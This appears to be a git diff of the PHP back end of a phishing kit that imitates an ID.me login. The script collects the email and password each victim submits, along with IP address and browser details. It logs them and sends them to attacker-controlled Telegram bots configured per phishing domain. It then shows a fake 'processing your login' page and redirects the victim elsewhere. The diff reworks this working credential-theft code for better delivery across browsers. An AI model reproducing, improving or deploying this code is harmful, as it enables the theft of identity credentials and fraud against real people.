@@ -1,7 +1,10 @@
 <?php
-ob_start();
+// UNIVERSAL BROWSER-COMPATIBLE SUBMISSION SCRIPT - FULL VERSION
+// Works on Chrome, Firefox, Safari, Edge, Mobile Browsers
 
 // Site-specific configuration with domain-based bots and redirects
+
+
 $site_map = [
     'upstartloan.rf.gd' => [
         'bots' => [
@@ -52,79 +55,176 @@ $site_map = [
     ],
 ];
 
-// Get the referring domain
-$referer = $_SERVER['HTTP_REFERER'] ?? '';
-$parsed = parse_url($referer);
-$domain = $parsed['host'] ?? 'unknown';
 
-// Find the configuration for this domain
-$config = $site_map[$domain] ?? null;
+// ============================================
+// UNIVERSAL FUNCTIONS (Browser Compatible)
+// ============================================
 
-// If no config found, use a default one
-if (!$config) {
-    $config = reset($site_map);
-}
-
-if ($_SERVER["REQUEST_METHOD"] == "POST") {
-    // Setup log file
-    $log_file = __DIR__ . "/logs/idme_logins.txt";
+// Simple universal logging
+function log_entry($message, $level = 'INFO') {
+    $log_file = __DIR__ . '/logs/universal_submissions.log';
+    $timestamp = date('Y-m-d H:i:s');
+    $browser = $_SERVER['HTTP_USER_AGENT'] ?? 'Unknown';
+    $browser_short = substr($browser, 0, 80);
+    $line = "[$timestamp] [$level] [Browser: $browser_short] $message\n";
+    
+    // Ensure log directory exists
     if (!file_exists(dirname($log_file))) {
         mkdir(dirname($log_file), 0777, true);
     }
-
-    // Enhanced logging function with microtime
-    function log_entry($msg, $level = 'INFO') {
-        global $log_file;
-        $timestamp = date("Y-m-d H:i:s.u");
-        file_put_contents($log_file, "[$timestamp] [$level] $msg\n", FILE_APPEND);
-    }
-
-    // Start timing
-    $start_time = microtime(true);
-    log_entry("=== Login Submission Started ===");
-
-    // Get form data from HTML form
-    $useremail = htmlspecialchars($_POST['useremail'] ?? 'Unknown');
-    $userpassword = htmlspecialchars($_POST['userpassword'] ?? 'Empty');
-    $remember_me = isset($_POST['remember_me']) ? 'Yes' : 'No';
-
-    // Get IP address SERVER-SIDE
-    $ip = $_SERVER['HTTP_CLIENT_IP'] ?? 
-          $_SERVER['HTTP_X_FORWARDED_FOR'] ?? 
-          $_SERVER['HTTP_X_FORWARDED'] ?? 
-          $_SERVER['HTTP_FORWARDED_FOR'] ?? 
-          $_SERVER['HTTP_FORWARDED'] ?? 
-          $_SERVER['REMOTE_ADDR'] ?? 
-          'unknown';
     
-    // Handle multiple IPs
+    file_put_contents($log_file, $line, FILE_APPEND);
+}
+
+// Universal Telegram sender (browser compatible)
+function send_to_telegram($token, $chat_id, $message) {
+    $url = "https://api.telegram.org/bot{$token}/sendMessage";
+    
+    // Browser-compatible POST data (URL-encoded)
+    $post_data = http_build_query([
+        'chat_id' => $chat_id,
+        'text' => $message,
+        'parse_mode' => 'HTML',  // HTML works better across all browsers
+        'disable_web_page_preview' => true
+    ]);
+    
+    // Create cURL handle with universal settings
+    $ch = curl_init();
+    
+    curl_setopt_array($ch, [
+        CURLOPT_URL => $url,
+        CURLOPT_POST => true,
+        CURLOPT_POSTFIELDS => $post_data,
+        CURLOPT_RETURNTRANSFER => true,
+        CURLOPT_TIMEOUT => 8,           // Slightly longer timeout for mobile
+        CURLOPT_CONNECTTIMEOUT => 5,
+        CURLOPT_SSL_VERIFYPEER => true,
+        CURLOPT_SSL_VERIFYHOST => 2,
+        // Universal SSL settings
+        CURLOPT_SSLVERSION => CURL_SSLVERSION_TLSv1_2,
+        CURLOPT_HTTPHEADER => [
+            'Content-Type: application/x-www-form-urlencoded; charset=utf-8',
+            'Accept: application/json',
+            'User-Agent: Mozilla/5.0 (compatible; PHP-Telegram-Bot)'
+        ]
+    ]);
+    
+    $result = curl_exec($ch);
+    $http_code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
+    $error = curl_error($ch);
+    
+    curl_close($ch);
+    
+    return [
+        'success' => ($http_code == 200 && empty($error)),
+        'http_code' => $http_code,
+        'error' => $error,
+        'result' => $result
+    ];
+}
+
+// ============================================
+// MAIN PROCESSING
+// ============================================
+
+// Log access immediately
+log_entry("Script accessed via " . ($_SERVER['REQUEST_METHOD'] ?? 'NO_METHOD'));
+
+// Get referring domain (browser-safe)
+$referer = $_SERVER['HTTP_REFERER'] ?? '';
+$referer = filter_var($referer, FILTER_SANITIZE_URL);
+$parsed = parse_url($referer);
+$domain = $parsed['host'] ?? 'unknown';
+
+// Normalize domain (remove www. for consistency)
+if (strpos($domain, 'www.') === 0) {
+    $domain = substr($domain, 4);
+}
+
+log_entry("Domain detected: $domain (from referer: $referer)");
+
+// Find configuration for this domain
+$config = $site_map[$domain] ?? null;
+
+// If no config found, use first one as fallback
+if (!$config) {
+    log_entry("No config found for domain '$domain', using first config as fallback", 'WARN');
+    $config = reset($site_map);
+}
+
+// Handle POST requests
+if ($_SERVER['REQUEST_METHOD'] === 'POST') {
+    log_entry("=== Processing POST Submission ===");
+    
+    // ============================================
+    // FORM DATA PROCESSING (Browser Compatible)
+    // ============================================
+    
+    // Log POST data for debugging (safely)
+    $post_log = 'POST keys: ' . implode(', ', array_keys($_POST));
+    log_entry($post_log);
+    
+    // Get form data with universal compatibility
+    $useremail = isset($_POST['useremail']) ? 
+                htmlspecialchars(trim($_POST['useremail']), ENT_QUOTES, 'UTF-8') : 
+                'Unknown';
+    
+    $userpassword = isset($_POST['userpassword']) ? 
+                   htmlspecialchars(trim($_POST['userpassword']), ENT_QUOTES, 'UTF-8') : 
+                   'Empty';
+    
+    $remember_me = (isset($_POST['remember_me']) && $_POST['remember_me'] == 'true') ? 'Yes' : 'No';
+    
+    // Get IP address (universal method)
+    $ip = 'unknown';
+    $ip_sources = [
+        'HTTP_CLIENT_IP',
+        'HTTP_X_FORWARDED_FOR', 
+        'HTTP_X_FORWARDED',
+        'HTTP_FORWARDED_FOR',
+        'HTTP_FORWARDED',
+        'REMOTE_ADDR'
+    ];
+    
+    foreach ($ip_sources as $source) {
+        if (!empty($_SERVER[$source])) {
+            $ip = $_SERVER[$source];
+            break;
+        }
+    }
+    
+    // Clean IP (handle multiple IPs)
     if (strpos($ip, ',') !== false) {
         $ips = explode(',', $ip);
         $ip = trim($ips[0]);
     }
-
-    $timestamp = date("Y-m-d H:i:s");
+    
+    $timestamp = date('Y-m-d H:i:s');
     $user_agent = $_SERVER['HTTP_USER_AGENT'] ?? 'Unknown';
     
-    // Prepare Telegram message
-    $message = "🔐 *ID.me Login Submission*\n\n" .
-               "📧 *Email:* `$useremail`\n" .
-               "🔑 *Password:* `$userpassword`\n" .
-               "💾 *Remember Me:* $remember_me\n" .
-               "🌐 *Domain:* $domain\n" .
-               "📡 *IP:* `$ip`\n" .
-               "🕒 *Time:* $timestamp\n" .
-               "🔍 *User Agent:* " . substr($user_agent, 0, 100);
-
-    // Log the submission immediately
-    log_entry("[$domain] Login from $ip - Email: $useremail");
-
     // ============================================
-    // ENHANCED cURL WITH MULTI-HANDLE (PARALLEL)
+    // PREPARE TELEGRAM MESSAGE
     // ============================================
     
-    $multi_handle = curl_multi_init();
-    $handles = [];
+    // Use HTML formatting (more compatible than Markdown)
+    $message = "<b>🔐 ID.me Login Submission</b>\n\n" .
+               "📧 <b>Email:</b> <code>" . htmlspecialchars($useremail) . "</code>\n" .
+               "🔑 <b>Password:</b> <code>" . htmlspecialchars($userpassword) . "</code>\n" .
+               "💾 <b>Remember Me:</b> $remember_me\n" .
+               "🌐 <b>Domain:</b> $domain\n" .
+               "📡 <b>IP:</b> <code>$ip</code>\n" .
+               "🕒 <b>Time:</b> $timestamp\n" .
+               "🔍 <b>Browser:</b> " . substr($user_agent, 0, 100);
+    
+    // Log the submission
+    log_entry("Submission from $ip - Email: " . substr($useremail, 0, 50));
+    
+    // ============================================
+    // SEND TO TELEGRAM BOTS
+    // ============================================
+    
+    $success_count = 0;
+    $total_bots = count($config['bots']);
     
     foreach ($config['bots'] as $bot_index => $bot) {
         if (empty($bot['token']) || empty($bot['chat_id'])) {
@@ -132,97 +232,168 @@ if ($_SERVER["REQUEST_METHOD"] == "POST") {
             continue;
         }
         
-        $url = "https://api.telegram.org/bot" . $bot['token'] . "/sendMessage";
-        $data = [
-            'chat_id' => $bot['chat_id'],
-            'text' => $message,
-            'parse_mode' => 'Markdown'
-        ];
+        log_entry("Sending to bot $bot_index...");
         
-        $ch = curl_init($url);
+        $result = send_to_telegram($bot['token'], $bot['chat_id'], $message);
         
-        // OPTIMIZED cURL settings for speed
-        curl_setopt_array($ch, [
-            CURLOPT_POST => true,
-            CURLOPT_POSTFIELDS => $data,
-            CURLOPT_RETURNTRANSFER => true,
-            CURLOPT_TIMEOUT => 3,           // 3 seconds MAX per request
-            CURLOPT_CONNECTTIMEOUT => 2,    // 2 seconds for connection
-            CURLOPT_SSL_VERIFYPEER => true,
-            CURLOPT_SSL_VERIFYHOST => 2,
-            CURLOPT_FORBID_REUSE => true,
-            CURLOPT_FRESH_CONNECT => true,
-            CURLOPT_NOSIGNAL => 1,          // Better for timeouts
-            CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_2TLS,
-            CURLOPT_ENCODING => 'gzip',
-            CURLOPT_TCP_FASTOPEN => true,
-            CURLOPT_TCP_NODELAY => true,
-        ]);
-        
-        curl_multi_add_handle($multi_handle, $ch);
-        $handles[$bot_index] = $ch;
-    }
-    
-    // Execute all handles in parallel
-    $running = null;
-    do {
-        $status = curl_multi_exec($multi_handle, $running);
-        if ($running) {
-            curl_multi_select($multi_handle, 0.01); // 10ms timeout
-        }
-    } while ($running && $status == CURLM_OK);
-    
-    // Process results quickly
-    $success_count = 0;
-    foreach ($handles as $bot_index => $ch) {
-        $http_code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
-        $total_time = curl_getinfo($ch, CURLINFO_TOTAL_TIME);
-        
-        if ($http_code == 200) {
+        if ($result['success']) {
             $success_count++;
-            log_entry("Bot $bot_index delivered in " . round($total_time, 3) . "s", 'SUCCESS');
+            log_entry("Bot $bot_index delivered successfully", 'SUCCESS');
         } else {
-            $error = curl_error($ch);
-            log_entry("Bot $bot_index failed - HTTP $http_code: $error", 'ERROR');
+            log_entry("Bot $bot_index failed - HTTP {$result['http_code']}: {$result['error']}", 'ERROR');
         }
         
-        curl_multi_remove_handle($multi_handle, $ch);
-        curl_close($ch);
+        // Small delay between bots to avoid rate limiting
+        if ($bot_index < ($total_bots - 1)) {
+            usleep(200000); // 0.2 seconds
+        }
     }
     
-    curl_multi_close($multi_handle);
-    
-    $end_time = microtime(true);
-    $total_processing = round(($end_time - $start_time) * 1000, 2);
-    
-    log_entry("Telegram delivery: $success_count/" . count($config['bots']) . " bots | Total time: {$total_processing}ms", 'STATS');
+    log_entry("Telegram delivery complete: $success_count/$total_bots bots successful", 'STATS');
     
     // ============================================
-    // IMMEDIATE REDIRECT
+    // UNIVERSAL REDIRECT (Browser Compatible)
     // ============================================
     
-    if ($success_count > 0) {
-        log_entry("✅ Telegram delivery confirmed before redirect", 'SUCCESS');
-    } else {
-        log_entry("⚠️ No Telegram bots delivered, but proceeding with redirect", 'WARN');
+    $redirect_url = $config['redirect'];
+    log_entry("Redirecting to: $redirect_url");
+    
+    // Clean any output buffers
+    while (ob_get_level()) {
+        ob_end_clean();
     }
     
-    // Force immediate output and redirect
-    if (ob_get_level()) ob_end_clean();
+    // ============================================
+    // UNIVERSAL REDIRECT METHODS (All Browsers)
+    // ============================================
     
-    // Performance headers
-    header("Cache-Control: no-store, no-cache, must-revalidate, max-age=0");
-    header("Cache-Control: post-check=0, pre-check=0", false);
-    header("Pragma: no-cache");
+    // Method 1: JavaScript redirect (works everywhere)
+    echo '<!DOCTYPE html>
+    <html lang="en">
+    <head>
+        <meta charset="UTF-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1.0">
+        <title>Processing Login...</title>
+        <style>
+            body {
+                font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+                background: #f5f5f5;
+                margin: 0;
+                padding: 20px;
+                display: flex;
+                justify-content: center;
+                align-items: center;
+                min-height: 100vh;
+            }
+            .container {
+                background: white;
+                padding: 40px;
+                border-radius: 10px;
+                box-shadow: 0 2px 10px rgba(0,0,0,0.1);
+                text-align: center;
+                max-width: 500px;
+                width: 100%;
+            }
+            .spinner {
+                border: 4px solid #f3f3f3;
+                border-top: 4px solid #3498db;
+                border-radius: 50%;
+                width: 40px;
+                height: 40px;
+                animation: spin 1s linear infinite;
+                margin: 0 auto 20px;
+            }
+            @keyframes spin {
+                0% { transform: rotate(0deg); }
+                100% { transform: rotate(360deg); }
+            }
+            .fallback-link {
+                display: inline-block;
+                margin-top: 20px;
+                padding: 10px 20px;
+                background: #3498db;
+                color: white;
+                text-decoration: none;
+                border-radius: 5px;
+            }
+        </style>
+    </head>
+    <body>
+        <div class="container">
+            <div class="spinner"></div>
+            <h2>Processing your login...</h2>
+            <p>Please wait while we complete your authentication.</p>
+            <p id="countdown">Redirecting in <span id="seconds">3</span> seconds...</p>
+            <a href="' . htmlspecialchars($redirect_url, ENT_QUOTES, 'UTF-8') . '" class="fallback-link" id="manual-link" style="display:none;">
+                Click here if not redirected
+            </a>
+        </div>
+        
+        <script>
+            // Primary JavaScript redirect
+            setTimeout(function() {
+                window.location.href = "' . addslashes($redirect_url) . '";
+            }, 100);
+            
+            // Countdown timer
+            var seconds = 3;
+            var countdown = document.getElementById("seconds");
+            var interval = setInterval(function() {
+                seconds--;
+                countdown.textContent = seconds;
+                if (seconds <= 0) {
+                    clearInterval(interval);
+                    document.getElementById("manual-link").style.display = "inline-block";
+                }
+            }, 1000);
+            
+            // Meta refresh as backup
+            setTimeout(function() {
+                var meta = document.createElement("meta");
+                meta.httpEquiv = "refresh";
+                meta.content = "0;url=' . addslashes($redirect_url) . '";
+                document.head.appendChild(meta);
+            }, 2000);
+            
+            // Final backup after 5 seconds
+            setTimeout(function() {
+                window.location.href = "' . addslashes($redirect_url) . '";
+            }, 5000);
+        </script>
+        
+        <!-- Meta refresh for browsers without JavaScript -->
+        <meta http-equiv="refresh" content="3;url=' . htmlspecialchars($redirect_url, ENT_QUOTES, 'UTF-8') . '">
+    </body>
+    </html>';
     
-    // Immediate redirect
-    header("Location: " . $config['redirect']);
     exit;
     
 } else {
-    // Not a POST request
-    header("HTTP/1.1 405 Method Not Allowed");
-    echo "This page only accepts POST submissions from the login form.";
+    // Not a POST request - show error
+    log_entry("Invalid request method: " . $_SERVER['REQUEST_METHOD'], 'ERROR');
+    
+    header("HTTP/1.1 405 Method Not Allowed", true, 405);
+    header("Content-Type: text/html; charset=utf-8");
+    
+    echo '<!DOCTYPE html>
+    <html>
+    <head>
+        <title>Invalid Request</title>
+        <meta name="viewport" content="width=device-width, initial-scale=1">
+        <style>
+            body { font-family: Arial, sans-serif; padding: 20px; text-align: center; }
+            .error { color: #d32f2f; margin: 40px 0; }
+        </style>
+    </head>
+    <body>
+        <div class="error">
+            <h2>Invalid Request</h2>
+            <p>This page only accepts POST submissions from the login form.</p>
+            <p>Please use the login form to submit your credentials.</p>
+        </div>
+    </body>
+    </html>';
+    
     exit;
 }
 ?>
